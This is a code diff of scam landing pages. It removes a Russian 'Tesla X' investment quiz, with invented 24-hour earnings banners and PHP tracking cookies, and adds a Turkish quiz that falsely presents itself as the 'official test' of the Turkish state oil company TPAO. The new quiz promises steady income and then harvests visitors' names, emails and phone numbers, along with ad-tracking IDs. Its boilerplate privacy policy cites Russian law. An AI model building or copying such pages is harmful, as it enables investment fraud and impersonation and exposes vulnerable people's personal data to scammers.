@@ -1,345 +1,546 @@
-<?php
-$pixels = [ 'fb', 'fbe', 'ga', 'gad', 'mt', 'mtrk', 'tt', 'vk' ];
-foreach ( $pixels as $px ) if (isset( $_GET[$px] )) {
-	$z = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
-	if ( $z ) setcookie( $px, $z, time() + 2592000, '/' );
-}
-?><!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 
 <head>
-    <!-- 164 - 342  [o6;l8] tesla-x-quiz -->
-    <meta charset="utf-8">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <!-- 376 - 1814 [o18;l8] tpao-quiz-scnd -->
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla X</title>
-    <link rel="icon" type="image/x-icon" href="img/favicon/tesla.ico">
-    <link rel="stylesheet" href="css/index.css">
-    <link href="assets/landing/css/intlTelInput.css" rel="stylesheet" type="text/css">
+    <title>TPAO</title>
+    <link rel="stylesheet" href="css/style.css">
     <link href="assets/landing/css/landing.css" rel="stylesheet" type="text/css">
-    <!--[HEADER]--></head>
+<!--[HEADER]--></head>
 
-<body cz-shortcut-listen="true"><span id="warning-container"><i data-reactroot=""></i></span>
-    <header class="header">
-        <div class="upper-header__section">
-            <div class="container">
-                <ul class="upper-header__list">
-                    <li>
-                        <p class="upper-header__text">
-                            Заработано с нами за 24ч:
-                            <span class="upper-header__text--span">1,830,837.94$</span>
-                        </p>
-                    </li>
-                    <li>
-                        <p class="upper-header__text">
-                            Инвестировано в нас за 24ч:
-                            <span class="upper-header__text--span">4,232,583.23$</span>
-                        </p>
-                    </li>
-                    <li>
-                        <p class="upper-header__text">
-                            Выведено за 24ч:
-                            <span class="upper-header__text--span">921,353.77$</span>
-                        </p>
-                    </li>
-                </ul>
+<body>
+    <form action="api.php" method="post"><?php if (isset($_GET["utm_source"])) : ?><input type="hidden" name="utm_source" value="<?=htmlspecialchars($_GET["utm_source"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=htmlspecialchars($_GET["utm_content"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=htmlspecialchars($_GET["utm_term"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=htmlspecialchars($_GET["utm_campaign"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=htmlspecialchars($_GET["utm_medium"]);?>" /><?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=htmlspecialchars($_GET["subid"]);?>" /><?php endif; ?><?php if (isset($_GET["uuid"])) : ?><input type="hidden" name="uuid" value="<?=htmlspecialchars($_GET["uuid"]);?>" /><?php endif; ?><?php if (isset($_GET["fbclid"])) : ?><input type="hidden" name="fbclid" value="<?=htmlspecialchars($_GET["fbclid"]);?>" /><?php endif; ?><?php if (isset($_GET["gclid"])) : ?><input type="hidden" name="gclid" value="<?=htmlspecialchars($_GET["gclid"]);?>" /><?php endif; ?><?php if (isset($_GET["cpc"])) : ?><input type="hidden" name="cpc" value="<?=htmlspecialchars($_GET["cpc"]);?>" /><?php endif; ?><?php if (isset($_GET["cur"])) : ?><input type="hidden" name="cur" value="<?=htmlspecialchars($_GET["cur"]);?>" /><?php endif; ?>
+        <section class="slide slide--start">
+            <h1 class="slide__title">"<span>Türkiye Petrolleri Anonim Ortaklığı</span>" ile
+                hayallerinizi nasıl gerçekleştirebilirsiniz?</h1>
+            <p class="slide__desc">Platforma erişmek ve ülkenin kaynaklarından istikrarlı para kazanmaya başlamak için "Türkiye Petrolleri Kurumu"nun resmi testini tamamlayın</p>
+            <button class="slide__btn" type="button"><img src="img/btn_icon.svg" width="20" height="20" alt="">Testi baslat</button>
+            <a class="slide__link policy">Gizlilik Politikasını</a>
+        </section>
+        <section class="slide slide--frst hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="slide__card">
+                <h2 class="slide__subtitle">Kaç yaşındasın sen?</h2>
+                <div class="slide__group">
+                    <input type="radio" name="step1" value="25-35" id="step1-a">
+                    <label for="step1-a">25-35</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step1" value="35-45" id="step1-b">
+                    <label for="step1-b">35-45</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step1" value="45+" id="step1-c">
+                    <label for="step1-c">45+</label>
+                </div>
             </div>
+            <div class="slide__footer">
+                <p class="slide__desc">Birinci adim</p>
+                <div class="slide__wrap">
+                    <span class="step active"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                </div>
+            </div>
+        </section>
+        <section class="slide slide--scnd hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="slide__card">
+                <h2 class="slide__subtitle">İsteklerinizi yerine getirmek için ayda ne kadar para yeterli olur?</h2>
+                <div class="slide__group">
+                    <input type="radio" name="step2" value="10.000 Türk Lyra'sı" id="step2-a">
+                    <label for="step2-a">10.000 Türk Lyra'sı</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step2" value="25.000 Türk Lyra'sı" id="step2-b">
+                    <label for="step2-b">25.000 Türk Lyra'sı</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step2" value="50.000 Türk Lyra'sı" id="step2-c">
+                    <label for="step2-c">50.000 Türk Lyra'sı</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step2" value="100.000 Türk Lyra'sı" id="step2-d">
+                    <label for="step2-d">100.000 Türk Lyra'sı</label>
+                </div>
+            </div>
+            <div class="slide__footer">
+                <p class="slide__desc">İkinci adim</p>
+                <div class="slide__wrap">
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                </div>
+            </div>
+        </section>
+        <section class="slide slide--thrd hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="slide__card">
+                <h2 class="slide__subtitle">Düzenli bir gelir kaynağınız var mı?</h2>
+                <div class="slide__group">
+                    <input type="radio" name="step3" value="Evet var, her şeyden memnunum" id="step3-a">
+                    <label for="step3-a">Evet var, her şeyden memnunum</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step3" value="Evet var, ama daha iyisini hak ettiğimi inanıyorum" id="step3-b">
+                    <label for="step3-b">Evet var, ama daha iyisini hak ettiğimi inanıyorum</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step3" value="Gelirim istikrarsız" id="step3-c">
+                    <label for="step3-c">Gelirim istikrarsız</label>
+                </div>
+            </div>
+            <div class="slide__footer">
+                <p class="slide__desc">Üçüncü adim</p>
+                <div class="slide__wrap">
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                </div>
+            </div>
+        </section>
+        <section class="slide slide--frth hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="slide__card">
+                <h2 class="slide__subtitle">Yatırım konusunda deneyiminiz var mı?</h2>
+                <div class="slide__group">
+                    <input type="radio" name="step4" value="Evet, başarılı bir şekilde yatırım yapıyorum" id="step4-a">
+                    <label for="step4-a">Evet, başarılı bir şekilde yatırım yapıyorum</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step4" value="Daha önce yatırım yaptım" id="step4-b">
+                    <label for="step4-b">Daha önce yatırım yaptım</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step4" value="Hayır, henüz hiç deneyimim olmadı" id="step4-c">
+                    <label for="step4-c">Hayır, henüz hiç deneyimim olmadı</label>
+                </div>
+            </div>
+            <div class="slide__footer">
+                <p class="slide__desc">Dördüncü adım</p>
+                <div class="slide__wrap">
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                </div>
+            </div>
+        </section>
+        <section class="slide slide--ffth hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="slide__card">
+                <h2 class="slide__subtitle">Ek Gelir Kaynaklariniz var mi?</h2>
+                <div class="slide__group">
+                    <input type="radio" name="step5" value="Evet, var" id="step5-a">
+                    <label for="step5-a">Evet, var</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step5" value="Evet, ama dengesiz" id="step5-b">
+                    <label for="step5-b">Evet, ama dengesiz</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step5" value="Hayır, ama istiyorum" id="step5-c">
+                    <label for="step5-c">Hayır, ama istiyorum</label>
+                </div>
+            </div>
+            <div class="slide__footer">
+                <p class="slide__desc">Beşinci adım</p>
+                <div class="slide__wrap">
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step"></span>
+                    <span class="step"></span>
+                </div>
+            </div>
+        </section>
+        <section class="slide slide--sxth hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="slide__card">
+                <h2 class="slide__subtitle">Türkiye Petrolleri Anonim Ortaklığı PROJESİNİ NEREDEN ÖĞRENDİNİZ?</h2>
+                <div class="slide__group">
+                    <input type="radio" name="step6" value="TV reklamları" id="step6-a">
+                    <label for="step6-a">TV reklamları</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step6" value="İnternetteki reklamları" id="step6-b">
+                    <label for="step6-b">İnternetteki reklamları</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step6" value="Tanıdıklardan, arkadaşlardan veya akrabalardan" id="step6-c">
+                    <label for="step6-c">Tanıdıklardan, arkadaşlardan veya akrabalardan</label>
+                </div>
+            </div>
+            <div class="slide__footer">
+                <p class="slide__desc">Altıncı adım</p>
+                <div class="slide__wrap">
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step"></span>
+                </div>
+            </div>
+        </section>
+        <section class="slide slide--svnth hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="slide__card">
+                <h2 class="slide__subtitle">KIŞISEL DANIŞMANLIK ALMAK ISTER MISINIZ</h2>
+                <div class="slide__group">
+                    <input type="radio" name="step7" value="Evet, yeni bilgiler edinmek istiyorum" id="step7-a">
+                    <label for="step7-a">Evet, yeni bilgiler edinmek istiyorum</label>
+                </div>
+                <div class="slide__group">
+                    <input type="radio" name="step7" value="Evet, ama zaten bilgiliyim, eğitimin kalitesine/zorluğuna bağlı" id="step7-b">
+                    <label for="step7-b">Evet, ama zaten bilgiliyim, eğitimin kalitesine/zorluğuna bağlı</label>
+                </div>
+            </div>
+            <div class="slide__footer">
+                <p class="slide__desc">Yedinci adım</p>
+                <div class="slide__wrap">
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                    <span class="step active"></span>
+                </div>
+            </div>
+        </section>
+        <section class="slide slide--finish hide">
+            <img src="img/logo.webp" width="60" height="71" alt="Botas Logo" class="slide__logo">
+            <div class="form form--column">
+                <h2 class="form__title">Tebrikler! '<span>Türkiye Petrolleri Anonim Ortaklığı</span>' platformunda ki yatırımlar kullanımınıza açıldı</h2>
+                <p class="form__desc">İletişim bilgilerinizi bırakın ve hemen kazanmaya başlayın</p>
+                <label for="" class="form__label">
+                    <img class="form__input--icon" src="img/user.svg" width="20" height="20" alt="">
+                    <input class="form__input form__input--column input" name="forename" placeholder="İsim" type="text" required>
+                </label>
+                <label for="" class="form__label">
+                    <img class="form__input--icon" src="img/user.svg" width="20" height="20" alt="">
+                    <input class="form__input form__input--column input" name="surname" placeholder="Soyisim" type="text" required>
+                </label>
+                <label for="" class="form__label">
+                    <img class="form__input--icon" src="img/email.svg" width="20" height="20" alt="">
+                    <input class="form__input form__input--column input" name="email" placeholder="E-mail" type="email" required>
+                </label>
+                <label for="" class="form__label">
+                    <input class="form__input form__input--column phone phone-tr" placeholder="501 234-56-78" type="tel" name="phone" required>
+                </label>
+            </div>
+            <div class="form__check">
+                <label class="form__check--label text-muted" for="policy">
+                    <input type="checkbox" class="form__check--input" checked>
+                    <span><a class="form__check--link policy">
+                            Gizlilik
+                            Politikasını</a> kabul ediyorum</span></label>
+            </div>
+            <button class="form__btn form__btn--column" type="submit" name="submit">ücretsiz kayıt</button>
+            <input type="hidden" name="phonecc" value="90" class="phonecc"/>
+            <input type="hidden" name="country" value="tr"/>
+            <input type="hidden" name="comment" value="" />
+        </section>
+    </form>
+    <div class="popup hide" id="popup">
+        <div class="popup__privacy">
+            <img class="popup__close" id="close" src="img/xmark-black.svg" wifth="15" height="15" alt="close">
+            <h2 class="popup__title">Gizlilik Politikası</h2>
+            <p>Bu Kişisel Verilerin Gizliliği Politikası (bundan sonra Gizlilik Politikası olarak
+                anılacaktır), sitenin
+                 alan adında yer aldığı tüm bilgiler için geçerlidir; (alt alan adlarıyla
+                birlikte), programlarının ve ürünlerinin siteyi kullanırken Kullanıcı hakkında bilgi edinebilir.
+            </p>
+            <ol>
+                <li>
+                    <span>Terimlerin tanımı</span>
+                    <ol>
+                        <li>Bu Gizlilik Politikasında aşağıdaki terimler kullanılmaktadır:
+                            <ol>
+                                <li>"Site Yönetimi" (bundan sonra İdare olarak anılacaktır) - kişisel verileri
+                                    düzenleyen ve
+                                    (veya) işleyen ve ayrıca kişisel verilerin işlenme amaçlarını, işlenecek kişisel
+                                    verilerin bileşimini, eylemleri (işlemleri) belirleyen siteyi yönetmeye yetkili
+                                    çalışanlar kişisel verilerle gerçekleştirilir.</li>
+                                <li>"Kişisel veriler" - doğrudan veya dolaylı olarak tanımlanmış veya tanımlanabilir bir
+                                    gerçek kişiyle ilgili herhangi bir bilgi (kişisel verilerin konusu).</li>
+                                <li>"Kişisel verilerin işlenmesi" - toplama, kaydetme, sistemleştirme, biriktirme,
+                                    depolama,
+                                    açıklama (güncelleme, değiştirme) dahil olmak üzere otomasyon araçları kullanılarak
+                                    veya
+                                    kişisel verilerle bu tür araçlar kullanılmadan gerçekleştirilen herhangi bir eylem
+                                    (işlem) veya bir dizi eylem (işlem) , çıkarma, kullanma, aktarma (dağıtma, sağlama,
+                                    erişim), duyarsızlaştırma, engelleme, silme, kişisel verilerin imhası.</li>
+                                <li>“Kişisel verilerin gizliliği”, İşletmeci veya kişisel verilere erişimi olan diğer
+                                    kişiler için, kişisel verilerin sahibinin rızası veya diğer yasal gerekçeler
+                                    olmaksızın
+                                    bunların dağıtımını önlemek için zorunlu bir gerekliliktir.</li>
+                                <li>"Site", İnternet'te barındırılan birbirine bağlı web sayfalarının yanı sıra alt alan
+                                    adlarından oluşan bir koleksiyondur.</li>
+                                <li>"Alt alan adları", siteye ait üçüncü düzey alan adlarında bulunan sayfalar veya bir
+                                    dizi
+                                    sayfa ile alt kısmında İdarenin iletişim bilgilerinin belirtildiği diğer geçici
+                                    sayfalardır.</li>
+                                <li>"Site Kullanıcısı" (bundan sonra Kullanıcı olarak anılacaktır), internet üzerinden
+                                    siteye erişimi olan ve siteye ait bilgi, malzeme ve ürünleri kullanan kişidir.</li>
+                                <li>"Çerez", bir web sunucusu tarafından gönderilen ve kullanıcının bilgisayarında
+                                    saklanan,
+                                    web istemcisinin veya web tarayıcısının ilgili sitenin bir sayfasını her açmaya
+                                    çalıştığında bir HTTP isteğinde web sunucusuna gönderdiği küçük bir veri parçasıdır.
+                                </li>
+                                <li>"IP adresi" - Kullanıcının Businessman'a erişim kazandığı bir bilgisayar ağındaki
+                                    bir
+                                    düğümün benzersiz ağ adresi.</li>
+                            </ol>
+                        </li>
+                    </ol>
+                </li>
+                <li>
+                    <span>Genel Hükümler</span>
+                    <ol>
+                        <li>
+                            Sitenin Kullanıcı tarafından kullanılması, bu Gizlilik Politikasının ve Kullanıcının kişisel
+                            verilerinin işlenmesi koşullarının kabulü anlamına gelir.
+                        </li>
+                        <li>
+                            Gizlilik Politikası hükümleri ile uyuşmazlık halinde, Kullanıcı siteyi kullanmayı
+                            bırakmalıdır.
+                        </li>
+                        <li>
+                            Bu Gizlilik Politikası site için geçerlidir. İşadamı, Kullanıcının web sitesinde bulunan
+                            bağlantıları takip edebileceği üçüncü şahısların web sitelerini kontrol etmez ve bunlardan
+                            sorumlu değildir.
+                        </li>
+                        <li>
+                            Yönetim, Kullanıcı tarafından sağlanan kişisel verilerin doğruluğunu doğrulamaz.
+                        </li>
+                    </ol>
+                </li>
+                <li>
+                    <span>Gizlilik politikasının konusu</span>
+                    <ol>
+                        <li>Bu Gizlilik Politikası, İdarenin
+                             sitesine kaydolurken İdarenin talebi üzerine Kullanıcının
+                            sağladığı kişisel verileri ifşa etmeme ve gizliliğini sağlama yükümlülüklerini belirler;
+                            veya
+                            bir e-posta bültenine abone olurken.
+                        </li>
+                        <li>
+                            Bu Gizlilik Politikası kapsamında işlenmesine izin verilen kişisel veriler, Kullanıcı
+                            tarafından
+                            sitedeki formların doldurulmasıyla sağlanır ve aşağıdaki bilgileri içerir:
+                            <ol>
+                                <li>
+                                    Kullanıcının soyadı, adı, soyadı;
+                                </li>
+                                <li>
+                                    Kullanıcının iletişim telefon numarası;
+                                </li>
+                                <li>
+                                    e-posta adresi (e-posta)
+                                </li>
+                                <li>
+                                    Kullanıcının ikamet ettiği yer (Şehir)
+                                </li>
+                            </ol>
+                        </li>
+                        <li>
+                            İşadamı, sayfaları ziyaret ederken otomatik olarak iletilen Verileri korur:
+                            - IP adresi;
+                            - çerezlerden gelen bilgiler;
+                            - tarayıcı bilgisi
+                            - erişim süresi;
+                            - yönlendiren (önceki sayfanın adresi).
+                            <ol>
+                                <li>
+                                    Çerezlerin devre dışı bırakılması, sitenin yetki gerektiren bölümlerine
+                                    erişilememesine neden olabilir.
+                                </li>
+                                <li>
+                                    Bir iş adamı, ziyaretçilerinin IP adresleri hakkında istatistik toplar. Bu bilgiler
+                                    teknik sorunları önlemek, tespit etmek ve çözmek için kullanılır.
+                                </li>
+                            </ol>
+                        </li>
+                        <li>
+                            Yukarıda belirtilmeyen diğer kişisel bilgiler (ziyaret geçmişi, kullanılan tarayıcılar,
+                            işletim sistemleri vb.), paragraflarda belirtilenler dışında güvenli saklama ve dağıtmamaya
+                            tabidir. 5.2. bu Gizlilik Politikasının.
+                        </li>
+                    </ol>
+                </li>
+                <li>
+                    <span>Kullanıcının kişisel bilgilerinin toplanma amaçları</span>
+                    <ol>
+                        <li>
+                            Yönetim, Kullanıcının kişisel verilerini aşağıdaki amaçlarla kullanabilir:
+                            <ol>
+                                <li>
+                                    Daha fazla yetkilendirmesi için sitede kayıtlı Kullanıcının kimliği.
+                                </li>
+                                <li>
+                                    Kullanıcıya kişiselleştirilmiş site verilerine erişim sağlama.
+                                </li>
+                                <li>
+                                    Bildirimlerin gönderilmesi, sitenin kullanımına ilişkin talepler, Kullanıcıdan gelen
+                                    taleplerin ve başvuruların işlenmesi dahil olmak üzere Kullanıcı ile geri bildirim
+                                    oluşturmak.
+                                </li>
+                                <li>
+                                    Başvuruları gönderilen franchise temsilcilerine transferler.
+                                </li>
+                                <li>
+                                    Kullanıcı tarafından sağlanan kişisel verilerin doğruluğunun ve eksiksizliğinin
+                                    teyidi.
+                                </li>
+                                <li>
+                                    Sitenin bölümlerini kullanmak için bir hesap oluşturun.
+                                </li>
+                                <li>
+                                    E-posta ile kullanıcı bildirimleri.
+                                </li>
+                                <li>
+                                    Site adına özel teklifler, haber bültenleri ve diğer bilgilerle Kullanıcıya onay
+                                    vermek.
+                                </li>
+                            </ol>
+                        </li>
+                    </ol>
+                </li>
+                <li>
+                    <span>Kişisel bilgileri işleme yöntemleri ve şartları</span>
+                    <ol>
+                        <li>
+                            Kullanıcı'nın kişisel verilerinin işlenmesi, otomasyon araçları kullanılarak veya bu araçlar
+                            kullanılmadan kişisel veri bilgi sistemleri dahil olmak üzere her türlü hukuka uygun şekilde
+                            süre sınırlaması olmaksızın gerçekleştirilir.
+                        </li>
+                        <li>
+                            Kullanıcının kişisel verileri, Rusya Federasyonu'nun yetkili devlet makamlarına yalnızca
+                            Rusya Federasyonu mevzuatı ile belirlenen gerekçelerle ve şekillerde aktarılabilir.
+                        </li>
+                        <li>
+                            Kişisel verilerin kaybı veya ifşası durumunda, Yönetim, Kullanıcıyı kişisel verilerin kaybı
+                            veya ifşası konusunda bilgilendirmeme hakkına sahiptir.
+                        </li>
+                        <li>
+                            İdare, Kullanıcının kişisel bilgilerini yetkisiz veya kazara erişime, imhaya, değiştirmeye,
+                            bloke etmeye, kopyalamaya, dağıtmaya ve ayrıca üçüncü şahısların diğer yasa dışı eylemlerine
+                            karşı korumak için gerekli organizasyonel ve teknik önlemleri alır.
+                        </li>
+                        <li>
+                            İdare, Kullanıcı ile birlikte, Kullanıcının kişisel verilerinin kaybolması veya ifşa
+                            edilmesinden kaynaklanan kayıpları veya diğer olumsuz sonuçları önlemek için gerekli tüm
+                            önlemleri alır.
+                        </li>
+                    </ol>
+                </li>
+                <li>
+                    <span>Tarafların hak ve yükümlülükleri</span>
+                    <ol>
+                        <li>
+                            Kullanıcı şu haklara sahiptir:
+                            <ol>
+                                <li>
+                                    Sitenin kullanımı için gerekli olan kişisel verilerinizin sağlanması konusunda özgür
+                                    karar verin ve bunların işlenmesine onay verin.
+                                </li>
+                                <li>
+                                    Bu bilgilerde değişiklik olması durumunda kişisel veriler hakkında sağlanan
+                                    bilgileri güncelleyin, tamamlayın.
+                                </li>
+                                <li>
+                                    Kullanıcı, federal yasalara uygun olarak sınırlandırılmamışsa, kişisel verilerinin
+                                    işlenmesiyle ilgili olarak İdareden bilgi alma hakkına sahiptir. Kullanıcı,
+                                    İdare'den kişisel verilerini açıklığa kavuşturmasını, kişisel verilerin eksik, eski,
+                                    yanlış, yasa dışı olarak elde edilmiş veya belirtilen işleme amacı için gerekli
+                                    olmaması durumunda bunları bloke etme veya yok etme ve ayrıca kanunla öngörülen
+                                    önlemleri almasını isteme hakkına sahiptir. haklarını korumak için. Bunun için
+                                    belirtilen e-mail adresine İdareye bildirimde bulunulması yeterlidir.
+                                </li>
+                            </ol>
+                        </li>
+                    </ol>
+                </li>
+            </ol>
         </div>
-        <div class="header__sec1">
-            <div class="container header__container">
-                <div class="header__nav">
-                    <a href="#" aria-label="link to main page"><img class="header__logo" src="img/TESLA-X.webp" loading="lazy" alt="logo tesla-X">
-                        <img class="header__logo--mobile" src="img/TESLA-Xmob.webp" loading="lazy" alt="logo tesla-X"></a>
-                </div>
-            </div><br>
-            <div class="container1">
-                <div class="header__scrollbal">
-                    <div class="header__scrollbal-over"></div>
-                </div>
-                <div class="header__navigation">
-                    <div class="header__arrow header__arrow-left">
-                        <svg width="25" height="25" viewbox="0 0 25 25" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="12.5" cy="12.5" r="12.5" fill="#F0F0F0"></circle>
-                            <g clip-path="url(#clip0_207_3)">
-                                <path d="M15.7974 18.7372C15.656 18.9059 15.4639 18.9914 15.2712 18.9912C15.0965 18.9912 14.9213 18.9211 14.7831 18.779L9.24037 13.0828C9.09397 12.9323 9.01079 12.7213 9.01079 12.5002C9.01079 12.2791 9.09396 12.0679 9.24037 11.9176L14.7831 6.22145C15.0737 5.92291 15.5278 5.94152 15.7975 6.2634C16.0673 6.58512 16.0503 7.08805 15.7597 7.38673L10.7838 12.5003L15.7597 17.6139C16.0503 17.9125 16.0673 18.4154 15.7975 18.7373L15.7974 18.7372Z" fill="#C70122"></path>
-                            </g>
-                            <defs>
-                                <clippath id="clip0_207_3">
-                                    <rect width="7" height="13" fill="white" transform="matrix(-1 0 0 1 16 6)"></rect>
-                                </clippath>
-                            </defs>
-                        </svg>
-                    </div>
-                    <div class="header__number">
-                        <span class="current-number">1</span>/5
-                    </div>
-                    <div class="header__arrow header__arrow-right">
-                        <svg width="25" height="25" viewbox="0 0 25 25" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle r="12.5" transform="matrix(-1 0 0 1 12.5 12.5)" fill="#F0F0F0"></circle>
-                            <g clip-path="url(#clip0_207_4)">
-                                <path d="M9.20256 18.7372C9.34398 18.9059 9.5361 18.9914 9.7288 18.9912C9.90355 18.9912 10.0787 18.9211 10.2169 18.779L15.7596 13.0828C15.906 12.9323 15.9892 12.7213 15.9892 12.5002C15.9892 12.2791 15.906 12.0679 15.7596 11.9176L10.2169 6.22145C9.92634 5.92291 9.47217 5.94152 9.20245 6.2634C8.93272 6.58512 8.94967 7.08805 9.24034 7.38673L14.2162 12.5003L9.24034 17.6139C8.94967 17.9125 8.93272 18.4154 9.20245 18.7373L9.20256 18.7372Z" fill="#C70122"></path>
-                            </g>
-                            <defs>
-                                <clippath id="clip0_207_4">
-                                    <rect width="7" height="13" fill="white" transform="translate(9 6)"></rect>
-                                </clippath>
-                            </defs>
-                        </svg>
-                    </div>
-                </div>
-            </div>
-            <main class="main">
-                <div class="container1">
-                    <section class="card card-one">
-                        <div class="card-wrapper card-one__wrapper">
-                            <h1 class="card__title card-one__title">
-                                Пройдите короткий опрос от компании "Tesla X" и начните
-                                зарабатывать
-                            </h1>
-                            <img class="card__img card-one__img" src="img/card_1.webp" width="146" height="111" alt="logo Tesla X">
-                        </div>
-                    </section>
-                    <section class="card card-two hidden">
-                        <div class="card-wrapper card-two__wrapper">
-                            <img class="card__lamp card-two__lamp" src="img/icon_lamp.webp" width="18" height="25" alt="">
-                            <h1 class="card__title">У вас был опыт в инвестировании?</h1>
-                            <p class="card__description">
-                                Это позволит команде подготовить необходимую стратегию
-                                инвестирования
-                            </p>
-                            <div class="card__checkbox">
-                                <div class="card__checkbox-wrapper border">
-                                    <input class="visually-hidden" type="radio" name="card-1" value="1" checked="">
-                                    <img class="card__img" src="img/card_2-yes.webp" width="68" height="68" alt="yes">
-                                    <p class="card__checkbox-text">Да</p>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <input class="visually-hidden" type="radio" name="card" value="2">
-                                    <img class="card__img" src="img/card_2-no.webp" width="68" height="68" alt="yes">
-                                    <p class="card__checkbox-text">Нет</p>
-                                </div>
-                            </div>
-                        </div>
-                    </section>
-                    <section class="card card-three hidden">
-                        <div class="card-wrapper card-three__wrapper">
-                            <img class="card__lamp card-three__lamp" src="img/icon_lamp.webp" width="18" height="25" alt="">
-                            <h1 class="card__title">Гражданином какой страны вы являетесь?</h1>
-                            <p class="card__description">
-                                Это позволит убедиться в возможности инвестирования
-                            </p>
-                            <div class="card__checkbox">
-                                <div class="card__checkbox-wrapper border">
-                                    <button data-country="usa" class="btn__country">
-                                        <input class="visually-hidden" type="radio" name="investment" value="usa">
-                                        <img class="card__img" src="img/flags/usa.webp" width="50" height="50" alt="yes">
-                                        <p class="card__checkbox-text">USA</p>
-                                    </button>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <button data-country="eu" class="btn__country">
-                                        <input class="visually-hidden" type="radio" name="investment" value="2" data-country="eu">
-                                        <img class="card__img" src="img/flags/european-union.webp" width="50" height="50" alt="yes">
-                                        <p class="card__checkbox-text">European Union</p>
-                                    </button>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <button data-country="ru" class="btn__country">
-                                        <input class="visually-hidden" type="radio" name="investment" value="3" data-country="ru">
-                                        <img class="card__img" src="img/flags/russia.webp" width="50" height="50" alt="yes">
-                                        <p class="card__checkbox-text">Russia</p>
-                                    </button>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <button data-country="ua" class="btn__country">
-                                        <input class="visually-hidden" type="radio" name="investment" value="4" id="checkbox" data-country="ua">
-                                        <img class="card__img" src="img/flags/ukraine.webp" width="50" height="50" alt="yes">
-                                        <p class="card__checkbox-text">Ukraine</p>
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                    </section>
-                    <section class="card card-four hidden">
-                        <div class="card-wrapper card-three__wrapper">
-                            <h1 class="card__title">
-                                Какую сумму вы бы хотели зарабатывать в месяц?
-                            </h1>
-                            <p class="card__description">
-                                Это позволит подготовить соответствующую торговую стратегию
-                            </p>
-                            <div class="card__checkbox">
-                                <div class="card__checkbox-wrapper border">
-                                    <input class="visually-hidden" type="radio" name="investment" value="1" checked="">
-                                    <div class="money__wraper money__wraper--first">
-                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
-                                    </div>
-                                    <p class="card__checkbox-text">до 2.500€</p>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <input class="visually-hidden" type="radio" name="investment" value="2">
-                                    <div class="money__wraper money__wraper--first">
-                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
-                                    </div>
-                                    <p class="card__checkbox-text">от 3.000€</p>
-                                </div>
-                                <div class="card__checkbox-wrapper">
-                                    <input class="visually-hidden" type="radio" name="investment" value="3">
-                                    <div class="money__wraper">
